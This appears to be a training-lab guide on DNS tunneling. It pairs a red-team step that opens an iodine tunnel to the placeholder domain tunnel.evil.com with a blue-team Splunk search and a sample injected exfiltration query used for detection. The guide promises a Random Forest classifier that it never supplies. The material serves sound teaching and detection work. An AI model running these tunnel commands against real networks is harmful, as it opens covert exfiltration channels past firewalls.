# 🚀 Scenario 15 Detailed Guide: DNS Tunneling + AI Detection

## 📖 1. Background & Theory
**Framework Mapping**: ATT&CK: T1071.004

Attackers bypass firewalls by encoding stolen data into subdomains (e.g., `base64data.evil.com`). Because DNS is usually allowed outbound, this works well. AI can easily spot the high Shannon entropy and length anomalies.

**Objective**: Simulate data exfiltration over DNS and build an ML classifier using Random Forest to detect the high-entropy query patterns.

---

## 🛠️ 2. Environment Setup
1. SSH into the GCP lab VM via IAP and ensure Docker is running (`docker ps`).
2. Execute the following command to prepare the target environment:
```bash
docker exec -it kali bash
# iodine is already baked into the kali image (see infrastructure/kali/Dockerfile) — no apt needed.
```
3. Ensure Splunk HEC is receiving logs over the VPC-internal network.

---

## 🔴 3. Red Team Walkthrough (Attack)
Follow these exact steps to simulate the attack.

**Command:**
```bash
iodined -f 10.10.30.50 tunnel.evil.com
iodine -f 10.10.30.50 tunnel.evil.com
```

**What is happening?**
We establish a DNS tunnel between the target and Kali. Traffic flows as heavily encoded DNS TXT/A queries.

**Expected Output:**
You should see a successful execution or data exfiltration on your attacker terminal. **Take a screenshot and save it to the `evidence/` folder in the scenario directory.**

---

## 🔵 4. Blue Team Walkthrough (Detection)
Now that the attack has occurred, switch to your Splunk Web Interface (GCP IAP Tunnel).

> ⚠️ **No live DNS feed in this lab.** Nothing forwards DNS query logs to Splunk, so
> `index=dns_logs` is empty by default. To exercise the SPL, inject a sample high-entropy
> tunneling query via HEC (token must allow the `dns_logs` index):
> ```bash
> curl -k https://YOUR_SPLUNK_INTERNAL_IP:8088/services/collector \
>   -H "Authorization: Splunk YOUR_SPLUNK_HEC_TOKEN" \
>   -d '{"index":"dns_logs","sourcetype":"dns","event":{"src_ip":"10.10.30.50","query":"aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbA.tunnel.evil.com"}}'
> ```
> (Repeat with different long random subdomains to trip the `>100 requests` threshold.)

1. Open `Apps -> Search & Reporting`.
2. Set the Time Range to `Last 15 minutes` to filter out noise.
3. Run the following Advanced SPL query:

```spl
index=dns_logs
| eval query_len=len(query)
| where query_len > 50
| stats count as dns_requests by src_ip
| where dns_requests > 100
```

**Analysis:**
This query searches the logs and correlates the malicious indicators. Review the results table. **Take a screenshot of the detected attack and save it to the `evidence/` folder.**

---

## 🛡️ 5. Mitigation & Fix
To secure the system against this vulnerability, implement the following:

**Recommendation:**
> Enforce strict DNS filtering. Only allow outbound DNS to corporate forwarders, and block newly registered or low-reputation domains.

*Once you have completed these steps, fill out the `README.md` file in this scenario's directory and push your changes to GitHub!*
